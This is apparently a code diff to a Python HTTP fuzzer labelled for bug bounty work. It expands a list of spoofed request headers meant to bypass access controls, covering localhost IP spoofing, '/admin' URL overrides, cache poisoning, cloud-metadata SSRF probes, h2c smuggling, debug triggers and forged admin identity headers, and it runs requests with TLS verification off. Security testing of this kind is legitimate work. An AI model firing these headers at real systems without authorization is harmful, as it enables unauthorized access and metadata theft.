@@ -9,7 +9,6 @@ import hashlib
 import re
 import warnings
 
-# 隱藏不安全 HTTPS 請求嘅警告
 warnings.filterwarnings("ignore", message="Unverified HTTPS request")
 
 METHODS = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD", "TRACE"]
@@ -28,35 +27,86 @@ BUG_BOUNTY_HEADERS = {
     "X-Originating-IP": "127.0.0.1",
     "CF-Connecting-IP": "127.0.0.1",
     "Fastly-Client-IP": "127.0.0.1",
-    
-    # --- Proxy Routing Overrides (API Gateways / NGINX / Apigee Bypasses) ---
+    "X-Cluster-Client-IP": "127.0.0.1",
+    "Akamai-Client-IP": "127.0.0.1",
+    "X-ProxyUser-Ip": "127.0.0.1",
+    "X-Custom-IP-Authorization": "127.0.0.1",
+    "Proxy-Client-IP": "127.0.0.1",
+    "WL-Proxy-Client-IP": "127.0.0.1",
+    "X-Originating-IP-Address": "127.0.0.1",
+    "X-Authenticated-User-IP": "127.0.0.1",
+    "X-Gateway-IP": "127.0.0.1",
+
+    # --- Proxy Routing Overrides & Gateway Bypasses ---
     "X-Original-URL": "/admin",
     "X-Rewrite-URL": "/admin",
     "X-Override-URL": "/admin",
     "X-Http-Destination-Override": "/admin",
-    "X-Custom-IP-Authorization": "127.0.0.1",
-    
-    # --- Cache Poisoning & Routing Defects ---
+    "X-Original-Request-URI": "/admin",
+    "Request-URI": "/admin",
+    "X-Destination": "/admin",
+    "X-Target": "/admin",
+    "X-Path-Override": "/admin",
+    "X-Target-URI": "/admin",
+    "X-Route-To": "/admin",
+
+    # --- Cache Poisoning & Host Header Injection ---
     "X-Forwarded-Scheme": "http",
     "X-Forwarded-Proto": "http",
     "X-Host": "127.0.0.1",
     "Forwarded": "for=127.0.0.1;proto=http;by=127.0.0.1",
     "X-Http-Method-Override": "POST",
     "X-Method-Override": "POST",
-    
+    "X-Forwarded-Port": "443",
+    "X-Forwarded-Server": "localhost",
+    "X-Forwarded-Extensions": "true",
+    "X-Cache-Purge": "true",
+    "X-Purge-Key": "1",
+
+    # --- Cloud Infrastructure & SSRF Targeting ---
+    "X-Forwarded-For-IPv4": "169.254.169.254", 
+    "X-Target-Internal": "10.0.0.1",
+    "X-Backend-Server": "192.168.1.1",
+    "Metadata-Flavor": "Google",               
+    "X-Aws-Parameters": "true",
+    "X-Kubernetes-Cluster": "localhost",
+
     # --- CORS Pre-flight & Origin Spoofing ---
     "Origin": "null",
     "Access-Control-Request-Method": "POST",
     "Access-Control-Request-Headers": "Authorization, Content-Type",
-    
-    # --- Content-Type & Serialization Alternatives (REST / GraphQL / gRPC confusion) ---
+    "X-Permitted-Cross-Domain-Policies": "all",
+
+    # --- Protocol Smuggling & h2c Upgrade ---
+    "Upgrade": "WebSocket",
+    "Connection": "Upgrade, HTTP2-Settings",
+    "HTTP2-Settings": "AAMAAABkAAQAAP__", 
+
+    # --- Debugging & Environment Mode Triggers ---
+    "X-Debug": "True",
+    "X-Debug-Mode": "1",
+    "X-Dev-Mode": "true",
+    "X-Admin": "true",
+    "X-Authenticated-User": "admin",
+    "X-Profile": "default",
+    "X-Trace": "true",
+    "X-Request-Debug": "true",
+    "X-Developer-Secret": "true",
+
+    # --- REST / GraphQL / gRPC / Framework Confusion ---
     "Content-Type": "application/graphql",
     "Accept": "application/json, text/plain, */*",
-    
-    # --- Protocol Smuggling & Hop-by-Hop Target Abuse ---
-    "Upgrade": "WebSocket",
-    "Connection": "Upgrade",
-    
+    "X-GraphQL-Method": "Query",
+    "X-SSR-Loopback": "true",
+    "X-Requested-With": "XMLHttpRequest",
+
+    # --- Microservices Identity Propagation ---
+    "X-User-Id": "1",
+    "X-User-Role": "admin",
+    "X-UID": "1",
+    "X-Role": "administrator",
+    "X-Username": "admin",
+
     # --- Session & Target Fingerprint Control ---
     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
 }
@@ -285,7 +335,6 @@ def main():
     
     print("[*] Calibration session active: establishing stable signatures...")
     try:
-        # 已加入 verify=False 忽略校準時的 SSL 證書錯誤
         with httpx.Client(timeout=6.0, follow_redirects=True, verify=False) as sample_client:
             start_baseline = time.time()
             baseline_res = sample_client.request(
@@ -305,7 +354,6 @@ def main():
         global abort_fuzzing
         queue = asyncio.Queue(maxsize=args.concurrency * 2)
         
-        # 已加入 verify=False 忽略異步發包時的 SSL 證書錯誤
         async with httpx.AsyncClient(verify=False) as client:
             workers = [
                 asyncio.create_task(worker(queue, client, target_url, base_body, args.output, args.sleep, args.max_errors))
